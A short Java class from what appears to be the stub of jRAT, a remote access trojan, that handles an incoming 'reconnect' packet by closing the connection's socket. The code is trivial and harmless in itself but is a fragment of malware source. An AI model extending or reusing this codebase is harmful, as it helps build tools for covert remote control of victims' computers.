package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;

public class Packet45Reconnect extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.getSocket().close();
	}

}
